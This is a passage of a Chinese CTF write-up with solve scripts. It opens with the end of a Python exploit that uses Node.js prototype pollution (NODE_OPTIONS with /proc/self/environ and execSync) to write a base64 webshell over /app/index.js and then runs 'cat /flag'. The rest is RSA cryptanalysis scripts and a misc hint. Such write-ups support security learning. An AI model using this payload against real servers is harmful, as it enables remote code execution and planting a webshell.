</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">app.use(router.routes())
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">app.listen(3000, () =&gt; {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    console.log(&#39;http://127.0.0.1:3000&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">})
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 将 WebShell 内容 Base64 编码</span>
</span></span><span style="display:flex;"><span>encoded_webshell <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(webshell<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Base64 解码后写入文件</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;constructor&#34;</span>: {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;prototype&#34;</span>: {
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;NODE_OPTIONS&#34;</span>: <span style="color:#e6db74">&#34;--require /proc/self/environ&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;env&#34;</span>: {
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;A&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;require(</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">child_process</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">).execSync(</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">echo </span><span style="color:#e6db74">{</span>encoded_webshell<span style="color:#e6db74">}</span><span style="color:#e6db74"> | base64 -d &gt; /app/index.js</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">)//&#34;</span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 原型链污染</span>
</span></span><span style="display:flex;"><span>requests<span style="color:#f92672">.</span>post(url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/config&#34;</span>, json<span style="color:#f92672">=</span>payload, headers<span style="color:#f92672">=</span>headers)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 触发 fork 实现 RCE</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>    requests<span style="color:#f92672">.</span>post(url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/process&#34;</span>, headers<span style="color:#f92672">=</span>headers)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 访问有回显的 WebShell</span>
</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/webshell?cmd=cat /flag&#34;</span>)
</span></span><span style="display:flex;"><span>print(res<span style="color:#f92672">.</span>text)
</span></span></code></pre></div><h2 id="misc-3">misc<a hidden class="anchor" aria-hidden="true" href="#misc-3">#</a></h2>
<h3 id="扫码领取flag">扫码领取flag<a hidden class="anchor" aria-hidden="true" href="#扫码领取flag">#</a></h3>
<p>hint看一下里面base64解密，另外一个图片crc爆破一下得到二维码，搜索一下对应的二维码种类得到flag</p>
<h2 id="crypto-3">crypto<a hidden class="anchor" aria-hidden="true" href="#crypto-3">#</a></h2>
<h3 id="圣石匕首">圣石匕首<a hidden class="anchor" aria-hidden="true" href="#圣石匕首">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> gmpy2
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> sage.all <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Parameters</span>
</span></span><span style="display:flex;"><span>beta <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.37</span>
</span></span><span style="display:flex;"><span>delta <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.01</span>
</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> <span style="color:#ae81ff">3668637434348843171145584606519031375027610199908169273169275927238735031431533260375377791001464799116453803408104076615710166171199990283470548282669948353598733020244755959461974603778630346457439345913209321194112256348302765254052193562603687450740346132207444615610078198488883539133291840346099727880587092122957231085658576850601488737629051252914095889313671875244094452330062619943781809984690384476868543570724769198985172300665613239047649089399919032152539462701309393130614829962670866062380816370571057536421400102100259975636785825540933280194583888638501981649650640939392658268133881679239293596283</span>
</span></span><span style="display:flex;"><span>N <span style="color:#f92672">=</span> <span style="color:#ae81ff">9748523098652101859947730585916490335896800943242955095820326993765071194474558998322598145898741779502734772138283011560029368500998354183150180904846368209977332058847768859238711047784703104535311583123388923571789764758869419482184613566672922481672444028753365755071127320541645016370072493604532087980626825687519083734367691341907014061379844209864141989961751681235215504772582878202048494707090104738899927036896915997556102574747166491969027546256022019959716418675672979328622656831990050058120299353807110233202113906317969377201045402271911946244076903611612303290556012512559696538977841061277173754331</span>
</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> <span style="color:#ae81ff">5374936627659221745209010619827617207565185520404653329184605916859755641352457088986635357806048863755173540232471505333583684733535121482637476692432365062808450583470788320547816186936317927449796090525477205337038591439577855884910604383190932340306435201976465543731935147881754136301375206828970248293731391543905441514528959500307972606931927112031018356411970001312995489429650903529877904694901310020882390008248466887950986326522740278880600110217817950511478637493101027659292006016454642135508207492151610829525082829566392116546434101694921106423469015683277992978077101831969525458693031031468092418427</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Calculate n and m</span>
</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> round((<span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>beta<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>delta)<span style="color:#f92672">/</span>((<span style="color:#ae81ff">1</span><span style="color:#f92672">-</span>beta)<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>delta<span style="color:#f92672">-</span>beta), <span style="color:#ae81ff">6</span>)
</span></span><span style="display:flex;"><span>m <span style="color:#f92672">=</span> (<span style="color:#ae81ff">1</span><span style="color:#f92672">-</span>beta) <span style="color:#f92672">*</span> n
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;m = </span><span style="color:#e6db74">{</span>m<span style="color:#e6db74">}</span><span style="color:#e6db74">, n = </span><span style="color:#e6db74">{</span>n<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Round n up to the nearest integer and convert m to an integer</span>
</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> int(n <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>m <span style="color:#f92672">=</span> int(m)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Calculate X and Y</span>
</span></span><span style="display:flex;"><span>X <span style="color:#f92672">=</span> int(pow(N, delta))
</span></span><span style="display:flex;"><span>Y <span style="color:#f92672">=</span> int(pow(N, delta<span style="color:#f92672">+</span>beta))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set up the polynomial ring</span>
</span></span><span style="display:flex;"><span>Z<span style="color:#f92672">.&lt;</span>x,y<span style="color:#f92672">&gt;</span> <span style="color:#f92672">=</span> ZZ[]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create the lattice</span>
</span></span><span style="display:flex;"><span>L <span style="color:#f92672">=</span> Matrix(ZZ, n, n)
</span></span><span style="display:flex;"><span>f <span style="color:#f92672">=</span> e<span style="color:#f92672">*</span>x <span style="color:#f92672">-</span> y
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(n):
</span></span><span style="display:flex;"><span>    g <span style="color:#f92672">=</span> list(N<span style="color:#f92672">**</span>max(<span style="color:#ae81ff">0</span>,m<span style="color:#f92672">-</span>i) <span style="color:#f92672">*</span> x<span style="color:#f92672">**</span>(n<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span>i) <span style="color:#f92672">*</span> f<span style="color:#f92672">**</span>i)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(len(g)):
</span></span><span style="display:flex;"><span>        L[i,j] <span style="color:#f92672">=</span> g[j][<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> X<span style="color:#f92672">**</span>(n<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span>j) <span style="color:#f92672">*</span> Y<span style="color:#f92672">**</span>j
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Apply LLL algorithm</span>
</span></span><span style="display:flex;"><span>L <span style="color:#f92672">=</span> L<span style="color:#f92672">.</span>LLL()[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Reconstruct the polynomial</span>
</span></span><span style="display:flex;"><span>coeff <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(n):
</span></span><span style="display:flex;"><span>    coeff<span style="color:#f92672">.</span>append((L[i]<span style="color:#f92672">//</span>(X<span style="color:#f92672">**</span>(n<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span>i)<span style="color:#f92672">*</span>Y<span style="color:#f92672">**</span>i), <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;x**</span><span style="color:#e6db74">{</span>n<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">*y**</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>))
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;+&#39;</span><span style="color:#f92672">.</span>join([<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>c[<span style="color:#ae81ff">0</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">*</span><span style="color:#e6db74">{</span>c[<span style="color:#ae81ff">1</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span> <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> coeff])
</span></span><span style="display:flex;"><span>f <span style="color:#f92672">=</span> eval(s)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Factor the polynomial</span>
</span></span><span style="display:flex;"><span>factored_f <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>factor()
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Factored polynomial:&#34;</span>, factored_f)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Extract the linear factor (if exists)</span>
</span></span><span style="display:flex;"><span>linear_factor <span style="color:#f92672">=</span> next((factor <span style="color:#66d9ef">for</span> factor, _ <span style="color:#f92672">in</span> factored_f <span style="color:#66d9ef">if</span> factor<span style="color:#f92672">.</span>degree() <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>), <span style="color:#66d9ef">None</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> linear_factor:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Extract k and dp from the linear factor</span>
</span></span><span style="display:flex;"><span>    k <span style="color:#f92672">=</span> abs(linear_factor<span style="color:#f92672">.</span>coefficients()[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    dp <span style="color:#f92672">=</span> abs(linear_factor<span style="color:#f92672">.</span>coefficients()[<span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Calculate p and q</span>
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> (e <span style="color:#f92672">*</span> dp <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">//</span> k <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    q <span style="color:#f92672">=</span> N <span style="color:#f92672">//</span> p
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Possible p: </span><span style="color:#e6db74">{</span>p<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Possible q: </span><span style="color:#e6db74">{</span>q<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Verify if p and q are correct</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> p <span style="color:#f92672">*</span> q <span style="color:#f92672">==</span> N:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Successfully factored N!&#34;</span>)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Calculate private key d</span>
</span></span><span style="display:flex;"><span>        phi <span style="color:#f92672">=</span> (p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>        d <span style="color:#f92672">=</span> int(gmpy2<span style="color:#f92672">.</span>invert(e, phi))
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Private key d: </span><span style="color:#e6db74">{</span>d<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Decrypt the message</span>
</span></span><span style="display:flex;"><span>        m <span style="color:#f92672">=</span> pow(c, d, N)
</span></span><span style="display:flex;"><span>        plaintext <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(hex(m)[<span style="color:#ae81ff">2</span>:])
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Decrypted message:&#34;</span>, plaintext)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Failed to factor N correctly.&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;No linear factor found. The attack might have failed.&#34;</span>)
</span></span></code></pre></div><h3 id="欧拉欧拉">欧拉欧拉！！<a hidden class="anchor" aria-hidden="true" href="#欧拉欧拉">#</a></h3>
<p>发现对n可以直接用factordb分解</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> <span style="color:#ae81ff">1523365295049608852447528761114036169506740936697335552555682720997896170562682523843468707748630306876516559528314335864164090878934605899152321495370201</span>
</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> <span style="color:#ae81ff">18104347461003907895610914021247683508445228187648940019610703551961828343286923443588324205257353157349226965840638901792059481287140055747874675375786201782262247550663098932351593199099796736521757473187142907551498526346132033381442243277945568526912391580431142769526917165011590824127172120180838162091</span>
</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> <span style="color:#ae81ff">65537</span>
</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> <span style="color:#ae81ff">14859652090105683079145454585893160422247900801288656111826569181159038438427898859238993694117308678150258749913747829849091269373672489350727536945889312021893859587868138786640133976196803958879602927438349289325983895357127086714561807181967380062187404628829595784290171905916316214021661729616120643997</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>q <span style="color:#f92672">=</span> n <span style="color:#f92672">//</span> p
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> isPrime(q):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;q 不是素数，检查输入&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;找到 q: </span><span style="color:#e6db74">{</span>q<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    phi_n <span style="color:#f92672">=</span> (p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    d <span style="color:#f92672">=</span> inverse(e, phi_n)
</span></span><span style="display:flex;"><span>    m <span style="color:#f92672">=</span> pow(c, d, n)
</span></span><span style="display:flex;"><span>    flag <span style="color:#f92672">=</span> long_to_bytes(m)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;flag =&#34;</span>, flag)
</span></span></code></pre></div><h1 id="week5">week5<a hidden class="anchor" aria-hidden="true" href="#week5">#</a></h1>
<h2 id="crypto-4">crypto<a hidden class="anchor" aria-hidden="true" href="#crypto-4">#</a></h2>
<h3 id="rsacmd5">RSA？cmd5！<a hidden class="anchor" aria-hidden="true" href="#rsacmd5">#</a></h3>
<p>得到的MD5值去cmd5的网址可以直接出，然后继续解密即可</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> gmpy2 <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 给定的密文和签名</span>
</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> <span style="color:#ae81ff">119084320846787611587774426118526847905825678869032529318497425064970463356147909835330423466179802531093233559613714033492951177656433798856482195873924140269461792479008703758436687940228268475598134411304167494814557384094637387369282900460926092035234233538644197114822992825439656673482850515654334379332</span>
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> <span style="color:#ae81ff">5461514893126669960233658468203682813465911805334274462134892270260355037191167357098405392972668890146716863374229152116784218921275571185229135409696720018765930919309887205786492284716906060670649040459662723215737124829497658722113929054827469554157634284671989682162929417551313954916635460603628116503</span>
</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> <span style="color:#ae81ff">139458221347981983099030378716991183653410063401398496859351212711302933950230621243347114295539950275542983665063430931475751013491128583801570410029527087462464558398730501041018349125941967135719526654701663270142483830687281477000567117071676521061576952568958398421029292366101543468414270793284704549051</span>
</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> <span style="color:#ae81ff">65537</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_MD5</span>(m0):
</span></span><span style="display:flex;"><span>    md5_object <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(m0<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    md5_result <span style="color:#f92672">=</span> md5_object<span style="color:#f92672">.</span>hexdigest()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> md5_result
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_s</span>(m0, d0, n0):
</span></span><span style="display:flex;"><span>    hm0 <span style="color:#f92672">=</span> get_MD5(m0)
</span></span><span style="display:flex;"><span>    hm1 <span style="color:#f92672">=</span> bytes_to_long(hm0<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    s0 <span style="color:#f92672">=</span> pow(hm1, d0, n0)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> s0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rsa_encode</span>(m0, e0, n0):
</span></span><span style="display:flex;"><span>    m1 <span style="color:#f92672">=</span> bytes_to_long(m0<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    c0 <span style="color:#f92672">=</span> pow(m1, e0, n0)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> c0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_flag</span>(m0):
</span></span><span style="display:flex;"><span>    flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{th1s_1s_my_k3y:&#39;</span> <span style="color:#f92672">+</span> m0 <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;0x&#39;</span> <span style="color:#f92672">+</span> hashlib<span style="color:#f92672">.</span>sha256(m0<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;}&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> flag
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">recover_message_from_signature</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;通过签名恢复MD5值&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    recovered_md5_int <span style="color:#f92672">=</span> pow(s, e, n)
</span></span><span style="display:flex;"><span>    recovered_md5 <span style="color:#f92672">=</span> long_to_bytes(recovered_md5_int)<span style="color:#f92672">.</span>decode()
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Recovered MD5: </span><span style="color:#e6db74">{</span>recovered_md5<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> recovered_md5
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">verify_message</span>(message):
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;验证消息的正确性&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 验证MD5</span>
</span></span><span style="display:flex;"><span>    calculated_md5 <span style="color:#f92672">=</span> get_MD5(message)
</span></span><span style="display:flex;"><span>    recovered_md5 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;86133884de98baada58a8c4de66e15b8&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Verification results:&#34;</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Message: </span><span style="color:#e6db74">{</span>message<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Calculated MD5: </span><span style="color:#e6db74">{</span>calculated_md5<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Expected MD5:   </span><span style="color:#e6db74">{</span>recovered_md5<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;MD5 Match: </span><span style="color:#e6db74">{</span>calculated_md5 <span style="color:#f92672">==</span> recovered_md5<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 计算签名验证</span>
</span></span><span style="display:flex;"><span>    hm1 <span style="color:#f92672">=</span> bytes_to_long(calculated_md5<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    verify_result <span style="color:#f92672">=</span> pow(s, e, n)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Signature verification: </span><span style="color:#e6db74">{</span>verify_result <span style="color:#f92672">==</span> hm1<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> calculated_md5 <span style="color:#f92672">==</span> recovered_md5
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Step 1: 从签名中恢复MD5</span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Step 1: Recovering MD5 from signature...&#34;</span>)
</span></span><span style="display:flex;"><span>    recovered_md5 <span style="color:#f92672">=</span> recover_message_from_signature()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Step 2: 我们已知消息是 &#34;adm0n12&#34;</span>
</span></span><span style="display:flex;"><span>    message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;adm0n12&#34;</span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Step 2: Using known message: </span><span style="color:#e6db74">{</span>message<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Step 3: 验证消息</span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Step 3: Verifying message...&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> verify_message(message):
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Step 4: 生成flag</span>
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Step 4: Generating flag...&#34;</span>)
</span></span><span style="display:flex;"><span>        flag <span style="color:#f92672">=</span> get_flag(message)
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Final Flag:&#34;</span>)
</span></span><span style="display:flex;"><span>        print(flag)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Step 5: 额外验证 - 检查密文</span>
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Step 5: Additional verification...&#34;</span>)
</span></span><span style="display:flex;"><span>        test_c <span style="color:#f92672">=</span> rsa_encode(flag, e, n)
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Ciphertext match: </span><span style="color:#e6db74">{</span>test_c <span style="color:#f92672">==</span> c<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Message verification failed!&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
